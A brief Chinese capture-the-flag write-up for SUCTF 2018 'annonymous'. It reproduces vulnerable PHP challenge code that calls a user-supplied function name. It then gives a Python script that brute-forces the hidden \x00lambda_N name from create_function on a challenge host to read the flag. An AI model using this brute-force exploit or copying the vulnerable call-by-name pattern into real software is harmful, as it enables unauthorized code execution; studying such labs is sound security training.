# [SUCTF 2018]annonymous

## 知识点

`create_function函数名`

## 解题

题目给出源码

```php
<?php

$MY = create_function("","die(`cat flag.php`);");
$hash = bin2hex(openssl_random_pseudo_bytes(32));
eval("function SUCTF_$hash(){"
    ."global \$MY;"
    ."\$MY();"
    ."}");
if(isset($_GET['func_name'])){
    $_GET["func_name"]();
    die();
}
show_source(__FILE__);
```

发现需要猜测`create_function`生成的函数名，`create_function`的函数名是有规律的，为`\x00lambda_%d`,`%d`即随机数字，爆破数字获取`flag`

```python
import requests
import time

for i in range(1, 100):
    print(f"try {str(i)}", flush=True)
    resp = requests.get(f'http://a06a64c6-749b-48b8-a4e4-d53e14a1be8d.node5.buuoj.cn:81/?func_name=\x00lambda_{str(i)}')
    if "flag" in resp.text:
        print(resp.text)
    time.sleep(0.5)
```

